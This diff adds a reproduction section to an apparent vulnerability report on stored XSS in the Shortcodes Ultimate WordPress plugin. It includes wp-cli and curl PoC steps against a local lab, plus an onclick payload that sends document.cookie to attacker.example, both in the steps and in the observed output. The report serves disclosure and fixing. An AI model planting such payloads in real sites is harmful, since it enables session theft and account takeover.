@@ -82,6 +82,62 @@ Attacker (Author role)
   → Admin session theft / credential harvesting possible
 ```
 
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/wp-shortcodes-ultimate/` (compose stack launched on `http://127.0.0.1:8096/`).
+
+**Pinned version:** Shortcodes Ultimate 7.8.2.
+
+**Stack actually used by lab:**
+- `wordpress:6-php8.2-apache` (WordPress 6.9.4, PHP 8.2.31, Apache/2.4.67)
+- `wordpress:cli-2.10-php8.2`
+- `mariadb:11`
+
+### Steps (executed in `poc.sh`)
+
+1. **Bring up the WP stack** and wait for HTTP 200.
+2. **Enable Unsafe Features** -- set `su_option_unsafe_features=on` via wp-cli (option must be enabled for shortcode to render; without it, plugin shows an error message instead of the button).
+3. **Create a published post** containing `[su_button onclick="alert(1)"]Click me[/su_button]`.
+4. **Fetch the post anonymously** and grep the rendered HTML for the `onClick` attribute.
+5. **Verify aggressive payload** -- create a second post with `[su_button onclick="javascript:fetch('https://attacker.example/steal?c='+document.cookie)"]Click[/su_button]` and confirm the JS lives verbatim in the rendered `onClick` attribute.
+
+### PoC commands
+
+```bash
+# Enable unsafe features
+wp option update su_option_unsafe_features on
+
+# Create post with XSS payload
+wp post create --post_status=publish --post_title="XSS PoC" \
+  --post_content='[su_button onclick="alert(document.cookie)"]Click me[/su_button]'
+
+# Fetch anonymously and check rendered HTML
+curl -s "http://127.0.0.1:8096/?p=5" | grep -o 'onClick="[^"]*"'
+# -> onClick="alert(document.cookie)"
+```
+
+### Observed output (excerpt from `targets/labs/wp-shortcodes-ultimate/results.txt`)
+
+```
+===== Step 2: Enable Unsafe Features option =====
+    OPTION_NOW='on'
+    UNSAFE_FEATURES_ENABLED=true
+
+===== Step 5: Try a more aggressive payload =====
+[+] onClick attribute on second post (the finding's full payload):
+    onClick="javascript:fetch(&#039;https://attacker.example/steal?c=&#039;+document.cookie)"
+
+===== Verdict =====
+*** Stored XSS CONFIRMED -- attacker JS lives verbatim in the rendered onClick attribute ***
+Verdict: CONFIRMED (one-click stored XSS in [su_button onclick])
+```
+
+### Verdict
+
+**CONFIRMED.** With Unsafe Features enabled (the default per SCU-VULN-008), an Author-level user can inject arbitrary JavaScript via the `[su_button onclick="..."]` shortcode. The `onclick` value is passed through `esc_attr()` which HTML-entity-encodes quotes but does NOT prevent JavaScript execution within an event handler context. The payload executes when any visitor clicks the rendered button. Both simple (`alert()`) and exfiltration (`fetch()`) payloads confirmed.
+
+---
+
 ## Recommended Fixes
 
 - Escape all shortcode attributes at output using `esc_attr()` for HTML attribute context
